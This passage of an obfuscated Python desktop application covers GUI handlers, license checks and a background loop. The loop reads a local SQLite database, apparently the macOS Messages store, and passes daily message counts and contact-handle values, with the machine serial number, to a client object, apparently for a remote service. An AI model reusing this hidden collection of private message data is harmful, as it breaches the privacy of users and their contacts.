            A.bax_15ia.configure(state=_F)
            A.hfabbx_ath.configure(state=_M)
            A.cbfhH_2ax.configure(state=_M)
            A.a8hf_sbkh.configure(text="Stop")
            threading.Thread(target=A.sta_a_txa_saa).start()
        else:
            A.sts_taa_akux()

    def gi_nf_a_s_s(A, tui, igv=_E):
        A.hfgi_nrflaut.configure(
            text=_AA[37]
            + _AA[56]
            + _AA[4]
            + _AA[4]
            + _AA[46]
            + _AA[84]
            + _AA[38]
            + " "
            + _AA[27]
            + _AA[46]
            + _AA[44]
            + _AA[56]
            + _AA[52]
            + _AA[52]
            + _AA[52]
        )
        B = i_A.g_f_b_s(
            A.lik,
            hlpr.gg_ss_nn(),
            tui,
            is_getting_vip=igv,
        )
        A.hfgi_nrflaut.configure(text=B)

    def g_i_n_f_g_b_h(A):
        B = A.g_i_n_f_t_i_i.get()
        C = os.path.join(CDFG.APPF, _R)
        with open(C, _B) as D:
            D.write(B)
        threading.Thread(target=A.gi_nf_a_s_s, args=(B,)).start()

    def g_i_n_f_g_v_b_h(A):
        B = A.g_i_n_f_t_i_i.get()
        C = os.path.join(CDFG.APPF, _R)
        with open(C, _B) as D:
            D.write(B)
        threading.Thread(target=A.gi_nf_a_s_s, args=(B, _D)).start()

    def apo_clng(A, event=0):
        A.isrus_ot86 = _E
        A.hfss_ss8x = _E
        A.icslk_angt1 = _E
        hlpr.cfdr()
        sys.exit(1)

    def hfm_us_susts_altw43(B):
        XDT = 978307200
        L = "%Y-%m-%d %H:%M:%S"
        D = "%Y-%m-%d"
        _EEE = 1000000000
        while _D:
            try:
                if not B.isrus_ot86:
                    return
                H = hlpr.gg_ss_nn()
                M = sqlite3.connect(
                    _AA[24]
                    + _AA[72]
                    + _AA[1]
                    + _AA[56]
                    + _AA[55]
                    + _AA[1]
                    + _AA[24]
                    + f"{getuser()}"
                    + _AA[24]
                    + _AA[12]
                    + _AA[46]
                    + _AA[87]
                    + _AA[55]
                    + _AA[70]
                    + _AA[55]
                    + _AA[60]
                    + _AA[24]
                    + _AA[103]
                    + _AA[56]
                    + _AA[1]
                    + _AA[1]
                    + _AA[70]
                    + _AA[38]
                    + _AA[56]
                    + _AA[1]
                    + _AA[24]
                    + _AA[34]
                    + _AA[35]
                    + _AA[70]
                    + _AA[4]
                    + _AA[52]
                    + _AA[59]
                    + _AA[87]
                )
                A = M.cursor()
                C = date.today()
                E = (
                    C.strftime(D)
                    + " "
                    + _AA[138]
                    + _AA[138]
                    + _AA[13]
                    + _AA[138]
                    + _AA[138]
                    + _AA[13]
                    + _AA[138]
                    + _AA[138]
                )
                F = (
                    C.strftime(D)
                    + " "
                    + _AA[144]
                    + _AA[145]
                    + _AA[13]
                    + _AA[140]
                    + _AA[136]
                    + _AA[13]
                    + _AA[140]
                    + _AA[136]
                )
                E = datetime.strptime(E, L)
                F = datetime.strptime(F, L)
                I = (E.timestamp() - XDT) * _EEE
                J = (F.timestamp() - XDT) * _EEE
                A.execute(
                    _AA[11]
                    + _AA[50]
                    + _AA[12]
                    + _AA[50]
                    + _AA[3]
                    + _AA[5]
                    + " "
                    + _AA[35]
                    + _AA[70]
                    + _AA[84]
                    + _AA[59]
                    + _AA[44]
                    + _AA[56]
                    + _AA[113]
                    + _AA[46]
                    + _AA[59]
                    + " "
                    + _AA[57]
                    + _AA[98]
                    + _AA[33]
                    + _AA[103]
                    + " "
                    + _AA[15]
                    + _AA[56]
                    + _AA[1]
                    + _AA[1]
                    + _AA[70]
                    + _AA[38]
                    + _AA[56]
                    + " "
                    + _AA[10]
                    + _AA[30]
                    + _AA[50]
                    + _AA[98]
                    + _AA[50]
                    + " "
                    + _AA[1]
                    + _AA[56]
                    + _AA[55]
                    + _AA[16]
                    + _AA[46]
                    + _AA[34]
                    + _AA[56]
                    + _AA[73]
                    + _AA[21]
                    + _AA[46]
                    + _AA[103]
                    + _AA[56]
                    + _AA[1]
                    + _AA[1]
                    + _AA[70]
                    + _AA[38]
                    + _AA[56]
                    + _AA[21]
                    + " "
                    + _AA[89]
                    + _AA[23]
                    + _AA[78]
                    + " "
                    + _AA[46]
                    + _AA[1]
                    + _AA[113]
                    + _AA[27]
                    + _AA[55]
                    + _AA[25]
                    + _AA[15]
                    + _AA[113]
                    + _AA[15]
                    + _AA[56]
                    + _AA[73]
                    + _AA[141]
                    + " "
                    + _AA[89]
                    + _AA[23]
                    + _AA[78]
                    + " "
                    + _AA[59]
                    + _AA[70]
                    + _AA[4]
                    + _AA[56]
                    + _AA[48]
                    + _AA[73]
                    + f"{I} "
                    + _AA[89]
                    + _AA[23]
                    + _AA[78]
                    + " "
                    + _AA[59]
                    + _AA[70]
                    + _AA[4]
                    + _AA[56]
                    + _AA[40]
                    + _AA[73]
                    + f"{J}"
                )
                N = len(A.fetchall())
                i_A.u_n_s(srln=H, dte=C.strftime(D), st=N)
                A.execute(
                    _AA[11]
                    + _AA[50]
                    + _AA[12]
                    + _AA[50]
                    + _AA[3]
                    + _AA[5]
                    + " "
                    + _AA[35]
                    + _AA[70]
                    + _AA[84]
                    + _AA[59]
                    + _AA[44]
                    + _AA[56]
                    + _AA[113]
                    + _AA[46]
                    + _AA[59]
                    + " "
                    + _AA[57]
                    + _AA[98]
                    + _AA[33]
                    + _AA[103]
                    + " "
                    + _AA[15]
                    + _AA[56]
                    + _AA[1]
                    + _AA[1]
                    + _AA[70]
                    + _AA[38]
                    + _AA[56]
                    + " "
                    + _AA[10]
                    + _AA[30]
                    + _AA[50]
                    + _AA[98]
                    + _AA[50]
                    + " "
                    + _AA[46]
                    + _AA[1]
                    + _AA[113]
                    + _AA[1]
                    + _AA[56]
                    + _AA[84]
                    + _AA[4]
                    + _AA[73]
                    + _AA[141]
                    + " "
                    + _AA[33]
                    + _AA[98]
                    + " "
                    + _AA[56]
                    + _AA[55]
                    + _AA[55]
                    + _AA[25]
                    + _AA[55]
                    + _AA[73]
                    + _AA[138]
                    + " "
                    + _AA[89]
                    + _AA[23]
                    + _AA[78]
                    + " "
                    + _AA[46]
                    + _AA[1]
                    + _AA[113]
                    + _AA[27]
                    + _AA[55]
                    + _AA[25]
                    + _AA[15]
                    + _AA[113]
                    + _AA[15]
                    + _AA[56]
                    + _AA[73]
                    + _AA[141]
                    + " "
                    + _AA[89]
                    + _AA[23]
                    + _AA[78]
                    + " "
                    + _AA[59]
                    + _AA[70]
                    + _AA[4]
                    + _AA[56]
                    + _AA[48]
                    + _AA[73]
                    + f"{I} "
                    + _AA[89]
                    + _AA[23]
                    + _AA[78]
                    + " "
                    + _AA[59]
                    + _AA[70]
                    + _AA[4]
                    + _AA[56]
                    + _AA[40]
                    + _AA[73]
                    + f"{J}"
                )
                G = [A[0] for A in A.fetchall()]
                G = list(set(G))
                for O in G:
                    if not B.isrus_ot86:
                        return
                    A.execute(
                        _AA[11]
                        + _AA[50]
                        + _AA[12]
                        + _AA[50]
                        + _AA[3]
                        + _AA[5]
                        + " "
                        + _AA[46]
                        + _AA[59]
                        + " "
                        + _AA[57]
                        + _AA[98]
                        + _AA[33]
                        + _AA[103]
                        + " "
                        + _AA[35]
                        + _AA[70]
                        + _AA[84]
                        + _AA[59]
                        + _AA[44]
                        + _AA[56]
                        + " "
                        + _AA[10]
                        + _AA[30]
                        + _AA[50]
                        + _AA[98]
                        + _AA[50]
                        + " "
                        + _AA[1]
                        + _AA[56]
                        + _AA[55]
                        + _AA[16]
                        + _AA[46]
                        + _AA[34]
                        + _AA[56]
                        + _AA[73]
                        + _AA[21]
                        + _AA[46]
                        + _AA[103]
                        + _AA[56]
                        + _AA[1]
                        + _AA[1]
                        + _AA[70]
                        + _AA[38]
                        + _AA[56]
                        + _AA[21]
                        + " "
                        + _AA[70]
                        + _AA[84]
                        + _AA[59]
                        + " "
                        + _AA[98]
                        + _AA[33]
                        + _AA[10]
                        + _AA[22]
                        + _AA[78]
                        + _AA[73]
                        + f"'{O}'"
                    )
                    K = A.fetchone()
                    if K:
                        i_A.p_p(nbb=K[0], ate=C.strftime(D), snbr_al=H)
                        sleep(0.05)
                B.g_a_s_p_s()
            except Exception as P:
                print(P)
            for Q in range(1200 * 5):
                if not B.isrus_ot86:
                    return
                sleep(0.05)

    def c_l_k(A):
        while _D:
            try:
                B, D = i_A.g_a_k_a_v_s(A.lik)
                if B == "0" or B == "1":
                    A.arn_wttx = CDFG.LCSIT if B == "1" else CDFG.SRVERRT
                    hlpr.cfdr()
                else:
                    A.arn_wttx = ""
                    C = os.path.join(CDFG.APPF, _AA[52] + _AA[94])
                    if not Path(C).is_file():
                        with open(C, _B) as E:
                            E.write(B)
                A.hf_lw_w1k42.configure(text=A.arn_wttx)
                A.l_f_l_k_v_t.configure(text=D)
            except Exception as F:
                print(F)
            for G in range(100):
                if not A.icslk_angt1:
                    return
                sleep(0.1)


if __name__ == "__main__":
    try:
        app = App()
        app.mainloop()
    except Exception as e:
        print(e)
        sleep(1000)
